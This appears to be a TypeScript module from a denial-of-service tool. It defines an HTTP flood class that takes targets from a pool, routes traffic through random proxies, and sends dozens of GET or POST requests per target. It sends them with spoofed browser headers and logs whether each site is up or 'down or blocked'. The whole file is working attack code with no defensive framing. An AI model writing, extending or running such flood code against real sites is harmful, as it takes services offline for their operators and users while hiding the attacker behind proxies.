import agent from 'superagent'
import sproxy from 'superagent-proxy'
sproxy(agent)

import { GetTarget } from '../external/targetsPool'
import { ProxyPool } from '../external/proxyPool'
import { Algorithm, Config, ExecutionResult } from './algorithm'

import { HttpHeadersUtils } from './utils/httpHeadersUtils'
import { sleep } from '../helpers'

export abstract class SimpleHTTP extends Algorithm {
  protected proxyPool: ProxyPool
  private validateStatusFn: () => boolean

  abstract get method(): 'POST' | 'GET'

  constructor (config: Config, proxyPool: ProxyPool) {
    super(config)
    this.proxyPool = proxyPool
    this.validateStatusFn = () => true
  }

  isValid (target: GetTarget): boolean {
    if (typeof target.page !== 'string' || !target.page.startsWith('http')) {
      return false
    }
    return true
  }

  async execute (target: GetTarget): Promise<ExecutionResult> {
    // Setting up proxy config
    let packetsSend = 0, packetsSuccess = 0

    let proxyConfig = null as string | null
    let repeats = 16 + Math.floor(Math.random() * 32)

    if (!this.config.useRealIP) {
      const proxy = this.proxyPool.getRandomProxy()
      if (proxy === null) {
        console.warn('Proxy request failed because proxy wasnt found.')
        await sleep(100)
        return { packetsSend, packetsSuccess, target, packetsNeutral: 0 }
      }
      if (proxy.username !== undefined && proxy.password !== undefined) {
        proxyConfig = `${proxy.scheme}://${proxy.username}:${proxy.password}@${proxy.host}:${proxy.port}`
      } else {
        proxyConfig = `${proxy.scheme}://${proxy.host}:${proxy.port}`
      }
      repeats += Math.floor(Math.random() * 32)
    }

    let success = true
    while (success && repeats > 0) {
      success = await this.makeRequest(target.page, proxyConfig)
      packetsSend += 1
      repeats -= 1
      if (success) {
        packetsSuccess++
      }
    }

    return { packetsSend, packetsSuccess, target, packetsNeutral: 0 }
  }

  protected async makeRequest (url: string, proxy: null | string) {
    try {
      const headers = HttpHeadersUtils.generateRequestHeaders()
      let request = agent(this.method, url)
      if (proxy !== null) {
        request = request.proxy(proxy)
      }
      request = request.set('Accept', headers.Accept)
      request = request.set('Accept-Language', headers['Accept-Language'])
      request = request.set('User-Agent', headers['User-Agent'])

      const response = await request.timeout(this.config.timeout)

      console.log(`${new Date().toISOString()} | ${url} | ${response.status}`)
      return true
    } catch (e) {
      // console.log(e)
      console.log(`${new Date().toISOString()} | ${url} | DOWN OR BLOCKED`)
      return false
    }
  }
}
